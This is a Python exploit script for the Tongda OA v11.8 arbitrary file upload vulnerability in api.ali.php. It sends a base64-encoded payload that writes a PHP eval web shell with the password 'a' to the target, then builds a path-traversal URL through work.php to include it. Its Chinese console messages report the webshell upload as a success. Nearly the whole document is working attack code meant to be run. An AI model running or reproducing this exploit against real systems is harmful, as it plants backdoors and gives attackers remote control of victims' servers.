import re
import time
import requests
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
        }
    headerx = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }  
    data='''--502f67681799b07e4de6b503655f5cae
Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
Content-Type: application/octet-stream
 
{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIGV2YWwoJF9SRVFVRVNUWydhXSk7Pz4nKTs=","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
--502f67681799b07e4de6b503655f5cae--'''
    data=data.encode("utf-8").decode("latin1")
    upload_url=target_url+'mobile/api/api.ali.php'
    exp_url=target_url+'inc/package/work.php?id=../../../../../myoa/attach/approve_center/2210/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4'
    console.print(now_time() + " [INFO]     正在检测通达OA v11.8 api.ali.php 任意文件上传漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(upload_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200:
            console.print(now_time() + ' [SUCCESS]  漏洞存在 上传webshell成功，请修改日期 包含并生成文件默认密码为a:{}'.format(exp_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  通达OA v11.8 api.ali.php 任意文件上传漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        

